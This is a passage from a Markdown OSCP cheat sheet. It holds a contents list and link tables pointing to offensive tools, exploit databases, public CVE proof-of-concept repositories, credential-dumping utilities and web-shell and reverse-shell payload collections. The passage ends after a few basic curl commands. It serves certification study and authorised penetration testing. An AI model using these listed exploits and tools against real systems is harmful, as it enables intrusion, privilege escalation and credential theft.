<p align="center">
  <img width="300" height="300" src="/images/kali-linux.svg">
</p>

# OSCP Cheat Sheet

## Table of Contents

- [Basics](#basics)
- [Information Gathering](#information-gathering)
- [Vulnerability Analysis](#vulnerability-analysis)
- [Web Application Analysis](#web-application-analysis)
- [Database Assessment](#database-assessment)
- [Password Attacks](#password-attacks)
- [Exploitation Tools](#exploitation-tools)
- [Post Exploitation](#post-exploitation)
- [Exploit Databases](#exploit-databases)
- [CVEs](#cves)
- [Payloads](#payloads)
- [Wordlists](#wordlists)
- [Reporting](#reporting)
- [Social Media Resources](#social-media-resources)
- [Commands](#commands)
	- [Basics](#basics-1)
		- [curl](#curl)
		- [File Transfer](#file-transfer)
  		- [FTP](#ftp)
		- [Kerberos](#kerberos)
		- [Linux](#linux)
		- [Microsoft Windows](#microsoft-windows)
		- [PHP Webserver](#php-webserver)
		- [Ping](#ping)
		- [Port Forwarding](#port-forwarding-1)
		- [Python Webserver](#python-webserver)
		- [RDP](#rdp)
		- [showmount](#showmount)
  		- [SMB](#smb)
        - [Mount](#mount)
        - [DNS](#dns)
		- [smbclient](#smbclient)
		- [SSH](#ssh)
    		- [SMTP](#smtp)
		- [Time and Date](#time-and-date)
		- [Tmux](#tmux)
        - [Searchsploit](#searchsploit)
		- [Upgrading Shells](#upgrading-shells)
		- [VirtualBox](#virtualbox)
		- [virtualenv](#virtualenv)
	- [Information Gathering](#information-gathering-1)
		- [memcached](#memcached)
		- [NetBIOS](#netbios)
		- [Nmap](#nmap)
		- [Port Scanning](#port-scanning)
		- [snmpwalk](#snmpwalk)
	- [Web Application Analysis](#web-application-analysis-1)
		- [Burp Suite](#burp-suite)
  		- [cadaver](#cadaver)
		- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
		- [ffuf](#ffuf)
		- [GitTools](#gittools)
		- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
		- [PDF PHP Inclusion](#pdf-php-inclusion)
		- [PHP Upload Filter Bypasses](#php-upload-filter-bypasses)
		- [PHP Filter Chain Generator](#php-filter-chain-generator)
		- [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)
		- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
		- [Upload Vulnerabilities](#upload-vulnerabilities)
        - [Gobuster](#gobuster)
		- [wfuzz](#wfuzz)
        - [Feroxbuster](#feroxbuster)
		- [WPScan](#wpscan)
		- [XML External Entity (XXE)](#xml-external-entity-xxe)
  		- [Path Traversal](#path-traversal)
    		- [Command Injection](#command-injection)  
	- [Database Analysis](#database-analysis)
 		- [impacket-mssqlclient](#impacket-mssqlclient)
		- [MongoDB](#mongodb)
		- [MSSQL](#mssql)
		- [MySQL](#mysql)
		- [NoSQL Injection](#nosql-injection)
		- [PostgreSQL](#postgresql)
		- [Redis](#redis)
		- [SQL Injection](#sql-injection)
		- [SQL Truncation Attack](#sql-truncation-attack)
		- [sqlite3](#sqlite3)
		- [sqsh](#sqsh)
	- [Password Attacks](#password-attacks-1)
		- [DonPAPI](#donpapi)
		- [fcrack](#fcrack)
  		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
		- [hashcat](#hashcat)
		- [Hydra](#hydra)
		- [John](#john)
		- [Kerbrute](#kerbrute)
		- [LaZagne](#lazagne)
		- [mimikatz](#mimikatz)
  		- [NetExec](#netexec)
		- [pypykatz](#pypykatz)
		- [Spray-Passwords](#spray-passwords)
	- [Exploitation Tools](#exploitation-tools-1)
		- [Metasploit](#metasploit)
	- [Post Exploitation](#post-exploitation-1)
 		- [Account Operators Group Membership](#account-operators-group-membership)
 		- [Active Directory](#active-directory)
 		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
		- [ADCSTemplate](#adcstemplate)
  		- [ADMiner](#adminer)
		- [BloodHound](#bloodhound)
		- [BloodHound Python](#bloodhound-python)
  		- [bloodyAD](#bloodyAD)
		- [Certify](#certify)
		- [Certipy](#certipy)
		- [enum4linux-ng](#enum4linux-ng)
		- [Evil-WinRM](#evil-winrm)
        - [Crackmapexec](#crackmapexec)
		- [Impacket](#impacket-1)
		- [JAWS](#jaws)
		- [Kerberos](#kerberos-1)
		- [ldapsearch](#ldapsearch)
		- [Linux](#linux-1)
		- [Microsoft Windows](#microsoft-windows-1)
		- [PassTheCert](#passthecert)
		- [PKINITtools](#pkinittools)
		- [Port Scanning](#port-scanning-1)
		- [powercat](#powercat)
		- [Powermad](#powermad)
		- [PowerShell](#powershell)
  		- [Check](#check)
		- [pwncat](#pwncat)
		- [rpcclient](#rpcclient)
		- [Rubeus](#rubeus)
        - [ADSearch](#ADSearch)
		- [RunasCs](#runascs)
		- [Seatbelt](#seatbelt)
		- [smbpasswd](#smbpasswd)
		- [winexe](#winexe)
        - [AMSI Bypass](#amsi-bypass)
	- [Social Engineering Tools](#social-engineering-tools)
		- [Microsoft Office Word Phishing Macro](#microsoft-office-word-phishing-macro)
		- [Microsoft Windows Library Files](#microsoft-windows-library-files)
	- [CVE](#cve)
		- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
		- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
		- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
		- [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
		- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
		- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
		- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
		- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
		- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
  		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
   		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
   		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
  		- [GodPotato LPE](#godpotato-lpe)
		- [Juicy Potato LPE](#juicy-potato-lpe)
  		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
  		- [PrintSpoofer LPE](#printspoofer-lpe)
		- [SharpEfsPotato LPE](#sharpefspotato-lpe)
		- [Shocker Container Escape](#shocker-container-escape)
	- [Payloads](#payloads-1)
		- [Exiftool](#exiftool)
		- [Reverse Shells](#reverse-shells)
		- [Web Shells](#web-shells)
	- [Templates](#templates)
		- [ASPX Web Shell](#aspx-web-shell)
		- [Bad YAML](#bad-yaml)
	- [Wordlists](#wordlists-1)
		- [Bash](#bash)
		- [CeWL](#cewl)
		- [CUPP](#cupp)
		- [crunch](#crunch)
  		- [JavaScript Quick Wordlist](#javascript-quick-wordlist)
		- [Username Anarchy](#username-anarchy)

### Basics

| Name | URL |
| --- | --- |
| Chisel | https://github.com/jpillora/chisel |
| CyberChef | https://gchq.github.io/CyberChef |
| Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| Swaks | https://github.com/jetmore/swaks |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| nikto | https://github.com/sullo/nikto |
| Sparta | https://github.com/SECFORCE/sparta |
| fierce | https://github.com/mschwager/fierce |
| ThreatCheck | https://github.com/rasta-mouse/ThreatCheck |

### Web Application Analysis

| Name | URL |
| --- | --- |
| ffuf | https://github.com/ffuf/ffuf |
| fpmvuln | https://github.com/hannob/fpmvuln |
| Gobuster | https://github.com/OJ/gobuster |
| JSON Web Tokens | https://jwt.io |
| JWT_Tool | https://github.com/ticarpi/jwt_tool |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHP Filter Chain Generator | https://github.com/synacktiv/php_filter_chain_generator |
| PHPGGC | https://github.com/ambionics/phpggc |
| Spose | https://github.com/aancw/spose |
| Wfuzz | https://github.com/xmendez/wfuzz |
| Feroxbuster | https://github.com/epi052/feroxbuster |
| WhatWeb | https://github.com/urbanadventurer/WhatWeb |
| WPScan | https://github.com/wpscanteam/wpscan |
| Davtest | https://github.com/cldrn/davtest |

### Database Assessment

| Name | URL |
| --- | --- |
| RedisModules-ExecuteCommand | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
| MSSQL Recon | https://github.com/skahwah/SQLRecon |

### Password Attacks

| Name | URL |
| --- | --- |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| Firefox Decrypt | https://github.com/unode/firefox_decrypt |
| hashcat | https://hashcat.net/hashcat |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| John | https://github.com/openwall/john |
| keepass-dump-masterkey | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | https://github.com/ropnop/kerbrute |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| NetExec | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | https://ntlm.pw |
| pypykatz | https://github.com/skelsec/pypykatz |

### Exploitation Tools

| Name | URL |
| --- | --- |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| Hoaxshell | https://github.com/t3l3machus/hoaxshell |

### Post Exploitation

| Name | URL |
| --- | --- |
| ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | https://github.com/ajm4n/adPEAS |
| BloodHound Docker | https://github.com/belane/docker-bloodhound |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | https://github.com/ly4k/BloodHound |
| BloodHound Collectors | https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors |
| BloodHound Python | https://github.com/dirkjanm/BloodHound.py |
| bloodhound-quickwin | https://github.com/kaluche/bloodhound-quickwin |
| Certify | https://github.com/GhostPack/Certify |
| Certipy | https://github.com/ly4k/Certipy |
| Cheat Sheet - Attack Active Directory | https://github.com/drak3hft7/Cheat-Sheet---Active-Directory |
| DonPAPI | https://github.com/login-securite/DonPAPI |
| enum4linux-ng | https://github.com/cddmp/enum4linux-ng |
| Ghostpack-CompiledBinaries | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | https://gtfobins.github.io |
| Impacket | https://github.com/fortra/impacket |
| Impacket Static Binaries | https://github.com/ropnop/impacket_static_binaries |
| JAWS | https://github.com/411Hall/JAWS |
| KrbRelay | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | https://github.com/n00py/LAPSDumper |
| LAPSToolkit | https://github.com/leoloobeek/LAPSToolkit |
| Windows-Exploit-Suggester | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | https://github.com/rebootuser/LinEnum |
| lsassy | https://github.com/Hackndo/lsassy |
| Moriaty | https://github.com/BC-SECURITY/Moriarty |
| nanodump | https://github.com/fortra/nanodump |
| PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| PKINITtools | https://github.com/dirkjanm/PKINITtools |
| powercat | https://github.com/besimorhino/powercat |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master//PowerUp.ps1 |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | https://github.com/itm4n/PPLdump |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |
| Check | https://github.com/itm4n/Check |
| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
| pspy | https://github.com/DominicBreuker/pspy |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | https://github.com/calebstewart/pwncat |
| pypykatz | https://github.com/skelsec/pypykatz |
| PyWhisker | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | https://github.com/GhostPack/Rubeus |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| RustHound | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | https://github.com/SpiderLabs/scavenger |
| SharpADWS | https://github.com/wh0amitz/SharpADWS |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| SharpChromium | https://github.com/djhohnstein/SharpChromium |
| SharpHound | https://github.com/BloodHoundAD/SharpHound |
| SharpView | https://github.com/tevora-threat/SharpView |
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| WADComs | https://wadcoms.github.io |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Whisker | https://github.com/eladshamir/Whisker |
| Windows--check | https://github.com/pentestmonkey/windows--check |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
| Sharpersist | https://github.com/mandiant/SharPersist |
| Sharpup | https://github.com/GhostPack/SharpUp |
| PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
| ADSearch |  https://github.com/tomcarver16/ADSearch |
| SUIDump | https://github.com/lypd0/SUIDump |
| ldapdomaindump | https://github.com/dirkjanm/ldapdomaindump |
| SharpSCCM | https://github.com/Mayyhem/SharpSCCM |
| AmsiBypass | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |

### Exploit Databases

| Database | URL |
| --- | --- |
| 0day.today Exploit Database | https://0day.today |
| Exploit Database | https://www.exploit-db.com |
| Packet Storm | https://packetstormsecurity.com |
| Sploitus | https://sploitus.com |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/Al1ex/CVE-2022-0847 |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit- |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Payloads

| Name | URL |
| --- | --- |
| Payload Box | https://github.com/payloadbox |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |

### Wordlists

| Name | URL |
| --- | --- |
| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |
| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |
| Windows LFI | https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/windows-lfi.txt |

### Reporting

| Name | URL |
| --- | --- |
| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
| SysReptor | https://github.com/Syslifters/sysreptor |
| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |

### Social Media Resources

| Name | URL |
| --- | --- |
| OSCP Guide 01/12 – My Exam Experience | https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
| HackTricks | https://book.hacktricks.xyz/ |
| HackTricks Local Windows Privilege Escalation Checklist | https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rednode Windows Privilege Escalation | https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/ |
| OSCP Cheat Sheet by xsudoxx | https://github.com/xsudoxx/OSCP |
| OSCP-Tricks-2023 by Rodolfo Marianocy | https://github.com/rodolfomarianocy/OSCP-Tricks-2023 |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/ |
| CRTP | https://github.com/Certs-Study/CRTP-Certified-Red-Team-Professional/blob/main/domain-enumeration/acls-enumeration.md |
| OSCP-Prep-1 | https://github.com/dashagriiva/OSCP-Prep-1 |
| Windows Local Privilege Escalation | https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook |
| Bloodhound | https://bloodhound.specterops.io/get-started/introduction |
| Compiled Binary | https://github.com/h4rithd/PrecompiledBinaries/tree/main/Nmap.exe |
| Compiled Binary | https://github.com/jakobfriedl/precompiled-binaries/tree/main |

## Commands

### Basics

#### curl

```c
curl -v http://<DOMAIN>                                                        // verbose output
curl -X POST http://<DOMAIN>                                                   // use POST method
curl -X PUT http://<DOMAIN>                                                    // use PUT method
